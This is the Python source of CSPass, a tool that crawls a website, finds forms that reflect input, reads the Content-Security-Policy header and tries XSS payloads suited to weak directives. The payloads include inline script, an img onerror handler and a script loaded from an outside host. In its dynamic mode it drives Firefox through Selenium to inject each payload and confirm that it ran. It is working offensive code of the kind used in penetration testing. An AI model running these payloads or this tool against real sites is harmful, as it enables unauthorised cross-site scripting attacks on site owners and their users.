#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# Author             : Ruulian
# Date created       : None

import argparse
import datetime
import re
from urllib.parse import urljoin, urlparse
import time
from requests_html import HTMLSession
from selenium import webdriver
import selenium

general_payload = "document.write(atob('PHAgaWQ9dGVzdGluZ19qc19leHBsb2l0X3BhcmFtPnRlc3Q8L3A+'))"

exploits_dic = {
    "script-src 'unsafe-inline'" : [
        f'<script>{general_payload}</script>',
        f'<img src=# onerror="{general_payload}">'
    ],
    "script-src data:" : [
        f'<script src="data:,{general_payload}"></script>'
    ],
    "script-src *" : [
        '<script src="https://0xhorizon.eu/cspass/exploit.js"></script>'
    ]
}

def date_formatted():
    return datetime.datetime.now().strftime("%H:%M:%S")

def escape(string:str):
    return string.translate(str.maketrans({" ":".+", "*":"\*", ".":"\.","/":"\/"}))

class Colors:
    # Foreground:
    FAIL = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    ERROR = '\033[91m'

    # Formatting
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'    
    
    # End colored text
    END = '\033[0m'
    NC ='\x1b[0m' # No Color    

class Scanner:
    def __init__(self, target, no_colors=False, dynamic=False, all_pages=False):
        self.no_colors = no_colors
        self.all_pages = all_pages
        self.dynamic = dynamic
        self.target = target
        self.pages = [self.target]
        self.print()
        self.print("[<]==============================[>]")
        self.print("[<]    Python CSPass @Ruulian_   [>]")
        self.print("[<]==============================[>]")
        self.print()
        self.sess = HTMLSession()

    def print(self, message=""):
        if self.no_colors:
            message = re.sub("\x1b[\[]([0-9;]+)m", "", message)
        print(message)

    def succeed(self, message=""):
        self.print(f"[{Colors.GREEN}SUCCEED{Colors.END}] {message}")

    def info(self, message=""):
        self.print(f"[{Colors.BLUE}{date_formatted()}{Colors.END}] {message}")
    
    def vuln(self, message=""):
        self.print(f"[{Colors.YELLOW}VULN{Colors.END}] {message}")

    def fail(self, message=""):
        self.print(f"[{Colors.FAIL}FAIL{Colors.END}] {message}")

    def error(self, message=""):
        self.print(f"[{Colors.ERROR}ERROR{Colors.END}] {message}")

    def get_all_pages(self, page):
        r = self.sess.get(page)
        if r.text != "":
            links = r.html.absolute_links
            for link in links:
                if link not in self.pages and urlparse(link).netloc == urlparse(self.target).netloc:
                    self.pages.append(link)
                    time.sleep(0.3)
                    self.get_all_pages(link)
                    return
        
class Page:
    def __init__(self, url):
        self.url = url
        self.sess = HTMLSession()
        self.csp = self.get_csp()

    def get_csp(self):
        r = self.sess.get(self.url)
        headers = r.headers
        if 'Content-Security-Policy' in headers:
            return headers['Content-Security-Policy'].split("; ")
        else:
            return []

    def get_forms(self):
        r = self.sess.get(self.url)
        if r.text != "":
            forms = r.html.find("form")
            return forms
        return []

    def scan(self):
        for vuln, exploit in exploits_dic.items():
            r = re.compile(escape(vuln))
            for policy in self.csp:
                if r.match(policy):
                    self.vuln = policy
                    self.payload = exploit[0]
                    return True
        return False
            
class Form:
    def __init__(self, url, action, method, names):
        self.url = url
        self.action = action
        self.method = method
        self.names = names
        self.sess = HTMLSession()

    def test_dom(self):
        parameters = {}
        value = "random_value_t0_test"
        for name in self.names:
            parameters[name] = value
        if self.method.lower() == "get":
            r = self.sess.get(self.action, params=parameters)
        elif self.method.lower() == "post":
            r = self.sess.post(self.action, data=parameters)

        if value in r.text:
            return True
        else:
            return False

    def exploit(self, payload):
        wb = webdriver.Firefox()
        wb.get(self.url)
        for name in self.names:
            form_input = wb.find_element_by_name(name)
            form_input.clear()
            form_input.send_keys(payload)
        form = wb.find_element_by_tag_name("form")
        form.submit()
        time.sleep(0.5)

        try:
            wb.find_element_by_id("testing_js_exploit_param")
            wb.close()
            return True
        except selenium.common.exceptions.NoSuchElementException:
            wb.close()
            return False

def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='Bypass CSP to perform a XSS')

    parser.add_argument("--no-colors", dest="no_colors", action="store_true", help="Disable color mode")
    parser.add_argument("-d", "--dynamic", dest="dynamic", action="store_true", help="Use dynamic mode")
    parser.add_argument("-a", "--all-pages", dest="all_pages", action="store_true", help="Looking for vulnerability in all pages could be found", required=False)

    required_args = parser.add_argument_group("Required argument")
    required_args.add_argument("-t", "--target", help="Specify the target url",  required=True)
    
    auth = parser.add_argument_group('Authentication')
    auth.add_argument("-c", "--cookie", help="Specify cookies", required=False)
    args = parser.parse_args()
    return args

if __name__ == '__main__':
    #args = parse_args()
    #scan = Scanner(target=args.target, no_colors=args.no_colors, dynamic=args.dynamic, all_pages=args.all_pages)
    scan = Scanner("http://localhost/0/", all_pages=True, dynamic=True)

    scan.info(f"Starting scan on target {scan.target}\n")
    
    if scan.all_pages:
        scan.info("Detecting all pages...")
        scan.get_all_pages(scan.target)
        scan.info(f"{len(scan.pages)} pages found\n")
    
    for p in scan.pages:
        page = Page(p)
        scan.info(f"Scanning page {page.url}")
        forms = page.get_forms()
        if forms != []:
            for form in forms:
                action = form.attrs['action']
                method = form.attrs['method']
                inputs = form.find("input[type=text]") + form.find("textarea")
                new_form = Form(page.url, urljoin(page.url, action), method, [input.attrs["name"] for input in inputs])

                if new_form.test_dom():
                    scan.info("Parameter reflected in DOM")
                    if page.csp != []:
                        if page.scan():
                            scan.vuln(f"Potential vulnerability found {page.vuln}")
                            scan.vuln(f"Potential payload found {page.payload}\n")
                            if scan.dynamic:
                                scan.info(f"Starting dynamic mode...")
                                exploitable = False
                                if new_form.exploit(page.payload):
                                    exploitable = True
                                    payload = page.payload
                                else:
                                    scan.fail("Potential exploit failed")
                                    scan.info("Trying all payloads")

                                    for exploits in exploits_dic.values():
                                        for exploit in exploits:
                                            if new_form.exploit(exploit):
                                                exploitable = True
                                                payload = exploit
                                                break
                                        if exploitable:
                                            break
                                if exploitable:
                                    scan.succeed(f"Payload found on {page.url}")
                                    scan.succeed(f"Payload: {payload}\n")
                                else:
                                    scan.fail("No exploit found")
                        else:
                            scan.fail(f"No exploit found\n")
                    else:
                        scan.fail(f"No CSP on page {page.url}\n")
                else:
                    scan.fail("No parameter reflected in DOM\n")
        else:
            scan.fail("No form found on this page\n")